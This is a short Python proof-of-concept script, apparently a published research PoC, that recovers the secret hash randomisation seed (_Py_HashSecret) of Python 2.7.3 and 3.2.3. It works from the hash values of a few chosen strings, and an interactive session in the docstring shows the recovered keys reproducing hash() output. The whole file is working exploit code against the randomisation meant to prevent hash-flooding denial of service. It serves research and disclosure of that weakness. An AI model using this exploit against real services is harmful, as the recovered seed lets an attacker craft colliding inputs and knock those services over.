"""
recovery of the secret seed of hash() in Python 2.7.3 and 3.2.3

usage:
$ python -R poc.py

example of interactive usage:
$ ls
poc.py
$ python -R
Python 2.7.3 (default, Apr 20 2012, 22:39:59) 
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import poc
32 candidate solutions
Verified solutions for _Py_HashSecret:
4eb19326c8429a27 bf38b46e27c958ee
ceb19326c8429a27 3f38b46e27c958ee
>>> poc.solutions
[(5670475200614013479, 13778961445146941678L), (14893847237468789287L,
4555589408292165870L)]
>>> hash("pizza") & 0xffffffffffffffff
10018956199723898988L
>>> poc.bytes_hash("pizza", poc.solutions[0][0], poc.solutions[0][1])
10018956199723898988L
>>> poc.bytes_hash("pizza", poc.solutions[1][0], poc.solutions[1][1])
10018956199723898988L
>>> 

authors: 
Jean-Philippe Aumasson, Daniel J. Bernstein
"""

candidates = []
solutions = []
mask = 0xffffffffffffffff

def bytes_hash( p, prefix, suffix ):
  if len(p) == 0: return 0
  x = prefix ^ (ord( p[0] )<<7)
  for i in range( len(p) ):
    x = ( ( x * 1000003 ) ^ ord(p[i]) ) & mask
  x ^= len(p) ^ suffix
  if x == -1: x = -2
  return x

def solvebit( h1, h2, prefix, bits ):
  f1 = 1000003  
  f2 = f1*f1
  target = h1^h2^3
  if bits == 64:
    if ((f1*prefix)^(f2*prefix)^target) & mask: return
    suffix = h1^1^(f1*prefix)
    suffix&= mask
    candidates.append( (prefix,suffix) )
  else:
    if ((f1*prefix)^(f2*prefix)^target) & ((1<<bits)-1):
      return
    solvebit(h1,h2,prefix,bits + 1)
    solvebit(h1,h2,prefix + (1 << bits),bits + 1)


h1 = hash("\0")     & mask
h2 = hash("\0\0")   & mask
h3 = hash("python") & mask

solvebit( h1, h2, 0, 0 )

print("%d candidate solutions" % (len(candidates)))
print("Verified solutions for _Py_HashSecret:")

for s in candidates:
  if bytes_hash("python",s[0],s[1]) == hash("python") & mask: 
    ok=1
    for i in range(100)[1:]:
      if bytes_hash("\3"*i,s[0],s[1]) != hash("\3"*i) & mask: 
        ok=0 
    if ok: 
      print("%016x %016x" % (s[0],s[1]))
      solutions.append(s)
